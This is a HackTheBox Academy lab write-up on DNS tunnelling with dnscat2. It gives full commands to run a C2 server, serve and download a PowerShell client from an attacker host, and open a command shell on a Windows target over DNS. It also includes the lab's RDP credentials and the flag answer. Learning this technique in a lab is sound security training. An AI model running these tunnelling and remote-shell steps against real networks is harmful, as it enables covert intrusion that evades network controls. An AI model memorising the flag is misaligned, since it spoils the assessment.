# DNS Tunneling with Dnscat2

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Pivoting, Tunneling, and Port Forwarding |
| 🔗 Section | [1436](https://academy.hackthebox.com/module/158/section/1436) |

---

## 🔑 Key Concepts

- **Dnscat2** — tunnels C2 traffic over DNS (port 53)
- Useful when other ports are blocked but DNS is allowed
- `server.rb` runs on **attack host**, PowerShell client runs on **Windows target**

### Flow
```
Windows Target → DNS queries → Kali dnscat2 server:53 → C2 shell
```

---

## 🛠️ Key Commands

### Setup Dnscat2 Server (Kali)
```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
sudo ruby dnscat2.rb --dns host=<tun0_ip>,port=53,domain=inlanefreight.local --no-cache
# Note the secret key shown on startup!
```

### Setup HTTP Server to Serve PS Client (Kali)
```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
cd dnscat2-powershell
python3 -m http.server 8123
```

### RDP to Windows Target (Kali)
```bash
xfreerdp3 /v:<target_ip> /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
```

### Download & Run Dnscat2 Client (Windows PowerShell - in RDP)
```powershell
Invoke-WebRequest -Uri "http://<tun0_ip>:8123/dnscat2.ps1" -OutFile "C:\Users\htb-student\dnscat2.ps1"
Import-Module C:\Users\htb-student\dnscat2.ps1
Start-Dnscat2 -DNSserver <tun0_ip> -Domain inlanefreight.local -PreSharedSecret <secret_key> -Exec cmd
```

### Interact with Shell (Kali dnscat2 console)
```bash
dnscat2> window -i 1
dnscat2> type C:\Users\htb-student\Documents\flag.txt
```

> ⚠️ PowerShell commands must be run **inside RDP session**, NOT in dnscat2 console!

---

## ❓ Questions

### Q1 — Contents of C:\Users\htb-student\Documents\flag.txt
**Answer:** `AC@tinth3Tunnel`

```bash
# TERMINAL 1 — Kali: start dnscat2 server
sudo ruby dnscat2.rb --dns host=10.10.15.221,port=53,domain=inlanefreight.local --no-cache

# TERMINAL 2 — Kali: serve PS client
cd ~/dnscat2-powershell && python3 -m http.server 8123

# TERMINAL 3 — Kali: RDP to target
xfreerdp3 /v:10.129.23.168 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore

# In RDP PowerShell:
Invoke-WebRequest -Uri "http://10.10.15.221:8123/dnscat2.ps1" -OutFile "C:\Users\htb-student\dnscat2.ps1"
Import-Module C:\Users\htb-student\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.15.221 -Domain inlanefreight.local -PreSharedSecret <secret> -Exec cmd

# Back in TERMINAL 1:
dnscat2> window -i 1
dnscat2> type C:\Users\htb-student\Documents\flag.txt
```
